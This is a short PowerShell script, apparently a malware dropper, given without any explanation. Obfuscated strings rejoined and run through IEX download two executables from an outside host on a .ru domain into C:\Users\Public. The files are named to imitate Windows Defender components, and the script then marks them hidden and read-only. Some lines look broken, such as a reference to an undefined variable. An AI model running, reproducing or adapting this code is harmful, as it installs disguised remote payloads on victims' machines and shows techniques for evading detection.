$splited = "(New-Object System.Net.Web~~Client).Downlo~~adFile('http://rphost.ru:5885/64.signed','C:\Users\Public\MSASC.exe')"
$unsplited = $splited.Replace("~~","")
IEX $unsplited

$split = "(New-Object System.Net.Web~~Client).Downlo~~adFile('http://rphost.ru:5885/MS_ASC64_1.signed','C:\Users\Public\MSASCuiL.exe')"
$unsplit = $split.Replace("~~","")
IEX $unsplit
$splt = "'C'+':\'+'User'+'s\'+'Pub'+'lic\'+'MSAS'+'Cui'+'L.e'+'xe'" | fo're'ach {$_.Attributes = 'ReadOnly, Hidden'}
$syscall = $ScriptBlock.Replace("?","").Replace("'","").Replace("+","").Replace("%","")
Ge't-It'em $syscall
